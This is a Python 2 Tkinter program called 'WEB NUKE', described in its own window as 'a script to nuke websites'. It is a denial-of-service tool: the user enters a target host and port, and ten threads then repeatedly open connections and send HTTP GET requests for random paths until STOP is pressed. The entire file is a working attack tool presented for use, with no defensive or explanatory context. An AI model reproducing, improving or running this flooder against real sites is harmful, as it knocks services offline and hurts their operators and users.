from Tkinter import *
import socket, threading, string, random
import tkFont
active = False
popup = False
def start():
    global active
    active = True
    input_ip = sv.get()
    input_port = iv.get()
    ip = socket.gethostbyname(input_ip)
    port = input_port
    threads = []
    def generate_url_path():
        msg = str(string.letters + string.digits + string.punctuation)
        data = "".join(random.sample(msg, 5))
        return data
    def attack():
        while active == True:
            try:
                url_path = generate_url_path()
                dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                dos.connect((ip, port))
                dos.send("GET /{} HTTP/1.1\nHost: {}\n\n".format(url_path, ip))
            except:
                print ("DEBUG")
    for i in range(10):
        t = threading.Thread(target=attack)
        t.daemon = False
        t.start()
        threads.append(t)
    for thread in threads:
        thread.join()
def main_Thread():
    t = threading.Thread(target=start)
    t.start()
def stop():
    global active
    active = False
window = Tk()
sv = StringVar()
iv = IntVar()
photo = PhotoImage('nuke.gif')
window.geometry("400x400")
window.title("WEB NUKE(By Benasin)")
bg_photo = Label(window, image = photo).place(x=0, y=0, relwidth=1, relheight=1)
label_1= Label(window, text = "A script to nuke websites", font =10).pack()
entry_1 = Entry(window, textvariable = sv, width = 50, justify = 'center').place(x=50,y =50)
entry_2 = Entry(window, textvariable = iv, width = 50, justify = 'center').place(x=50,y =100)
button_start = Button(window, command = main_Thread, text = "NUKE",font = tkFont.Font(size=35,weight="bold")).place(x = 110, y = 150)
button_stop = Button(window, command = stop, text = "STOP",font = tkFont.Font(size=35,weight="bold")).place(x = 110, y = 270)
window.resizable(False,False)
window.mainloop()
